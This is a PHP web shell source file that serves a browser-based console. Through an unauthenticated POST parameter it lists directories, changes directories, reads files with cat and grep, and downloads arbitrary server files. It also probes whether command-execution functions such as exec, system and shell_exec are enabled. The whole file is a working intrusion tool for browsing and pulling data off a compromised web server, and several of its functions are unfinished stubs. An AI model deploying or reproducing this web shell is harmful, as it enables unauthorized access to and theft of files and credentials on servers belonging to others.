<?php

$current_page_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

define("SUCCESS", "white");
define("INFO", "grey");
define("WARNING", "yellow");
define("ERROR", "red");

if(isset($_POST['cmd'])) {

    $input_string = isset($_POST['cmd'])? $_POST['cmd'] : "whoami";
    $input = explode(" ", $input_string);
    $cmd = $input[0];
    $params = array_slice($input, 1); 

    //config
    $check_execution = false;
    $show_version = false;
    $show_phpinfo = false;

    function response($color, $text, $exit) {
        echo '<font color="' . $color . '">' . $text . '</font></br></br>';
        if($exit) die();
    }

    function path_cmd() {
        global $input_string;
        echo '<font color="green">' . getcwd()  . ': </font><font color="grey"> '. $input_string .'</font></br></br>';
    }

    function help($cmd) {
            switch ($cmd) {
                case 'ls':
                    $response = "`ls FOLDER_PATH`  - Same as `ls -la` in bash";
                    break;
                case 'whoami':
                    $response = "`whoami` - Tries to get UID using 'posix_geteuid()'. If the function is disabled, will get owner of webshell file, but this may differ from your UID.";
                    break;
                case 'download':
                    $response = "`download FILE_PATH` - Download file at <file_path>. Make sure to allow your browser to open new tab.";
                    break;
                default:
                    $response = "The following commands are available: `ls`,`cat`, `find`, `grep`, `download`, `upload`, `mkdir`, `whoami`. Type 'help <cmd>' for more details.";
                    break;
            }
            response(SUCCESS, $response, true);
    }

    function download($file) {
        if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
    }

    function ls($path) {
        $response = "";
        if (file_exists($path)) {
            $files = scandir($path);
            foreach ($files as $f) {
                $file = $path.'/'.$f;
                $permissions = fileperms($file);
                $owner = fileowner($file);
                $group = filegroup($file);
                $size = filesize($file);
                $date = date("F d Y H:i:s.", filectime($file));
                $response = $response . $permissions."  ".$owner."  ".$group."  ".$size."  ".$date."  ".$f."<br/>";
            }
        response(SUCCESS, $response, true);
        }
        else {
            response(ERROR, "Folder path not found", true);
        }
    }

    function find($search, $path) {
        //search for file with name in path
    }

    function grep($search, $path) {
        grep_file($search, $path);
        /*
        if file its file, cat it -> search for string, return
        if file is folder, make for loop and grep for each file
        */
    }

    function grep_file($search, $path) {
        $matches = array();

        $handle = @fopen($path, "r");
        if ($handle)
        {
            while (!feof($handle))
            {
                $buffer = fgets($handle);
                if(strpos($buffer, $search) !== FALSE)
                    $matches[] = $buffer;
            }
            fclose($handle);
        }

        //show results:
        print_r($matches);

    }

    function grep_folder($search, $path) {

    } 

    function logo() {
        response(SUCCESS, $response, true);
    }

    function cd($path) {
        chdir($path);
        pwd();
    }

    function pwd() {
        response(SUCCESS, getcwd(), true);
    }

    function whoami() {
        if(function_exists("posix_geteuid"))
            response(SUCCESS, 'Current script owner uid: ' . posix_geteuid(), true);
        else
            response(ERROR, 'Cannot get current user`s UID. The file owner is: ' . get_current_user() . ' (this may differ from UID)', true);
    }


    function check_command_execution($check) {
        if($check) {
            $response = "";
            $cmd_functions = array("exec", "passthru", "system", "shell_exec", "popen", "pcntl_exec");

            foreach($cmd_functions as $f)
            {
                $response .= "Can we execute ". $f."? ";
                if (function_exists($f)) 
                    $response .= "Yes </br>";
                else
                    $response .= "No </br>";  
            }
        }
        response(SUCCESS, $response, true);
    }

    function cat($file) {
        if( file_exists($file) ) {
            if(filesize($file) > 1000000){
                response(WARNING, "File is too big to display. Use `download` or change souce code idk", true);
            }
            else {
                    $content = file_get_contents($file);
                    response(SUCCESS, '<pre>'.htmlentities($content).'</pre>', true);
                }
        }
        else{
            response(ERROR, 'File path not found. Type absolute path!', true);
        }

    }


    switch ($cmd) {
        case 'whoami':
            path_cmd();
            whoami();
            break;
        case 'pwd':
            path_cmd();
            pwd();
            break;
        case 'ls':
            $path = getcwd();
            if(count($params) > 0) $path = $params[0];
            path_cmd();
            ls($path);
            break;
        case 'cd':
            path_cmd();
            $path = $params[0];
            cd($path);
            break;
        case 'logo':
            logo();
            break;
        case 'cat':
            path_cmd();
            $file = $params[0];
            cat($file);
            break;
        case 'grep':
            path_cmd();
            $search = $params[0];
            $path = $params[1];
            grep($search, $path);
            break;
        case 'download':
            path_cmd();
            $file = $params[0];
            download($file);
            break;
        default:
            $help_cmd = "";
            if(count($params) > 0) $help_cmd = $params[0];
            path_cmd();
            help($help_cmd);
            break;
    }
} else
{

}
?>

<script>

function clear_console(event) {
    var keyCode = ('which' in event) ? event.which : event.keyCode;
    if(keyCode == 13) {
            document.getElementById("cmd_input").value = "";
        }
}

function submit_console(event) {
    var keyCode = ('which' in event) ? event.which : event.keyCode;
    if(keyCode == 13) { 
            var cmd_input = document.getElementById("cmd_input").value;
            if(cmd_input.substring(0, 8) == "download"){
                document.getElementById("download_input").value = cmd_input;
                document.getElementById("download").submit();
            }
            else
            {
                var body_content = "cmd=" + encodeURI(cmd_input);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "<?php echo $current_page_url ?>", true);

                //Send the proper header information along with the request
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

                xhr.onreadystatechange = function() { // Call a function when the state changes.
                    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                        var paragraph = document.getElementById("output");
                        paragraph.innerHTML += xhr.response;
                        paragraph.scrollTop = paragraph.scrollHeight;
                    }
                }
                xhr.send(body_content);
            }
        }
}

</script>

<style>
.screen{
    width:100%;
    height: 100%;
    background-color: black;
}

.input{
    height: 50px;
    float: left;
    padding: 5px 5px 5px 10px;
    position: absolute;
    width: 100%;
    bottom: 0;
}

.output {
 font-family:verdana;
 color: grey;
 overflow: auto;
 height: 95%;
 padding-top: 10px;
 padding-right: 5px;
 padding-left: 10px;
}


</style>

<html>
<head>
</head>
<body>
    <div id="screen" class="screen">
        <div id="output" class="output"></div>
        <div id="input" class="input">
            <form> 
              <textarea id="cmd_input" rows="1" onkeydown="submit_console(event)" onkeyup="clear_console(event)" cols="250"></textarea> 
            </form> 
            <form target="_blank" id="download" action="<?php echo $current_page_url ?>" method="post"><input type="hidden" id="download_input" name="cmd" value=""></form>
        </div>
    </div>
</body>
</html>